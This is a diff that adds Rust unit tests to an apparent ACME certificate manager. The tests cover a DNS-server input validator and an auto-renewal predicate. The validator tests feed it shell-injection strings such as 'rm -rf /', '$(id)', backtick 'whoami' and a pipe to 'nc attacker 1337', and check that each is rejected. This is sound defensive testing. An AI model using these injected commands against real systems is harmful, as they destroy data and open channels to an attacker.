@@ -568,3 +568,183 @@ fn test_ovh_zone_extraction_deep_subdomain() {
     assert_eq!(zone, "rwx-g.fr");
     assert_eq!(sub, "_acme-challenge.a.b");
 }
+
+// --- is_valid_dns_server ---
+//
+// The predicate guards the `@server` argument passed to `dig`
+// inside `check_txt_record`. A lax whitelist here would turn into
+// a shell-injection pivot, so the filter has to reject every
+// meta-character we could imagine. Tests are split per intent so
+// a regression pinpoints the exact bypass.
+
+use super::dns01_manual::is_valid_dns_server;
+
+#[test]
+fn is_valid_dns_server_accepts_ipv4() {
+    assert!(is_valid_dns_server("8.8.8.8"));
+    assert!(is_valid_dns_server("1.1.1.1"));
+    assert!(is_valid_dns_server("192.168.1.1"));
+}
+
+#[test]
+fn is_valid_dns_server_accepts_ipv6_with_brackets() {
+    assert!(is_valid_dns_server("[2001:4860:4860::8888]"));
+    assert!(is_valid_dns_server("[::1]"));
+}
+
+#[test]
+fn is_valid_dns_server_accepts_hostname() {
+    assert!(is_valid_dns_server("ns1.example.com"));
+    assert!(is_valid_dns_server("dns-02.cloudflare.com"));
+}
+
+#[test]
+fn is_valid_dns_server_rejects_empty() {
+    assert!(!is_valid_dns_server(""));
+}
+
+#[test]
+fn is_valid_dns_server_rejects_too_long() {
+    let too_long = "a".repeat(254);
+    assert!(!is_valid_dns_server(&too_long));
+}
+
+#[test]
+fn is_valid_dns_server_rejects_shell_metacharacters() {
+    assert!(!is_valid_dns_server("8.8.8.8; rm -rf /"));
+    assert!(!is_valid_dns_server("`whoami`"));
+    assert!(!is_valid_dns_server("$(id)"));
+    assert!(!is_valid_dns_server("8.8.8.8 && echo pwned"));
+    assert!(!is_valid_dns_server("8.8.8.8|nc attacker 1337"));
+}
+
+#[test]
+fn is_valid_dns_server_rejects_whitespace() {
+    assert!(!is_valid_dns_server("8.8.8.8 "));
+    assert!(!is_valid_dns_server(" 8.8.8.8"));
+    assert!(!is_valid_dns_server("8.8\t8.8"));
+}
+
+#[test]
+fn is_valid_dns_server_rejects_quotes_and_slashes() {
+    assert!(!is_valid_dns_server("'8.8.8.8'"));
+    assert!(!is_valid_dns_server("\"8.8.8.8\""));
+    assert!(!is_valid_dns_server("8.8.8.8/24"));
+    assert!(!is_valid_dns_server("8.8.8.8\\n"));
+}
+
+// --- should_auto_renew ---
+//
+// Pure predicate extracted from the renewal loop so the filtering
+// logic can be tested without spinning a background task or
+// touching the network. Each test pins one of the four rules so
+// a regression says exactly which branch changed.
+
+use super::renewal::should_auto_renew;
+
+fn renewal_cert_fixture(
+    now: chrono::DateTime<chrono::Utc>,
+    days_until_expiry: i64,
+    is_acme: bool,
+    auto_renew: bool,
+    acme_method: Option<&str>,
+) -> lorica_config::models::Certificate {
+    lorica_config::models::Certificate {
+        id: "cert-fixture".into(),
+        domain: "example.com".into(),
+        san_domains: vec![],
+        fingerprint: "deadbeef".into(),
+        cert_pem: "---CERT---".into(),
+        key_pem: "---KEY---".into(),
+        issuer: "Let's Encrypt".into(),
+        not_before: now - chrono::Duration::days(60),
+        not_after: now + chrono::Duration::days(days_until_expiry),
+        is_acme,
+        acme_auto_renew: auto_renew,
+        created_at: now - chrono::Duration::days(60),
+        acme_method: acme_method.map(String::from),
+        acme_dns_provider_id: None,
+    }
+}
+
+#[test]
+fn should_auto_renew_rejects_non_acme() {
+    let now = chrono::Utc::now();
+    let cert = renewal_cert_fixture(now, 5, false, true, None);
+    assert!(!should_auto_renew(&cert, now, 30));
+}
+
+#[test]
+fn should_auto_renew_rejects_opted_out() {
+    let now = chrono::Utc::now();
+    let cert = renewal_cert_fixture(now, 5, true, false, Some("http01"));
+    assert!(!should_auto_renew(&cert, now, 30));
+}
+
+#[test]
+fn should_auto_renew_rejects_dns01_manual() {
+    let now = chrono::Utc::now();
+    let cert = renewal_cert_fixture(now, 5, true, true, Some("dns01-manual"));
+    assert!(
+        !should_auto_renew(&cert, now, 30),
+        "dns01-manual certs must never be auto-renewed, the operator has to confirm the TXT record"
+    );
+}
+
+#[test]
+fn should_auto_renew_accepts_http01_inside_window() {
+    let now = chrono::Utc::now();
+    let cert = renewal_cert_fixture(now, 10, true, true, Some("http01"));
+    assert!(should_auto_renew(&cert, now, 30));
+}
+
+#[test]
+fn should_auto_renew_accepts_dns01_cloudflare_inside_window() {
+    let now = chrono::Utc::now();
+    let cert = renewal_cert_fixture(now, 10, true, true, Some("dns01-cloudflare"));
+    assert!(should_auto_renew(&cert, now, 30));
+}
+
+#[test]
+fn should_auto_renew_accepts_exactly_at_threshold() {
+    let now = chrono::Utc::now();
+    // The cert expires in exactly `threshold_days + 1` hours so
+    // `(not_after - now).num_days()` rounds down to `threshold`.
+    let not_after = now + chrono::Duration::days(30) + chrono::Duration::hours(1);
+    let cert = lorica_config::models::Certificate {
+        id: "cert-edge".into(),
+        domain: "edge.example.com".into(),
+        san_domains: vec![],
+        fingerprint: "ff".into(),
+        cert_pem: "---CERT---".into(),
+        key_pem: "---KEY---".into(),
+        issuer: "Let's Encrypt".into(),
+        not_before: now - chrono::Duration::days(60),
+        not_after,
+        is_acme: true,
+        acme_auto_renew: true,
+        created_at: now - chrono::Duration::days(60),
+        acme_method: Some("http01".into()),
+        acme_dns_provider_id: None,
+    };
+    assert!(
+        should_auto_renew(&cert, now, 30),
+        "cert at exactly the threshold must qualify (predicate is <=, not <)"
+    );
+}
+
+#[test]
+fn should_auto_renew_rejects_outside_window() {
+    let now = chrono::Utc::now();
+    let cert = renewal_cert_fixture(now, 60, true, true, Some("http01"));
+    assert!(!should_auto_renew(&cert, now, 30));
+}
+
+#[test]
+fn should_auto_renew_accepts_already_expired() {
+    let now = chrono::Utc::now();
+    // Negative remaining days must still trigger renewal : an
+    // expired cert is the most urgent renewal case, not a no-op.
+    let cert = renewal_cert_fixture(now, -1, true, true, Some("http01"));
+    assert!(should_auto_renew(&cert, now, 30));
+}
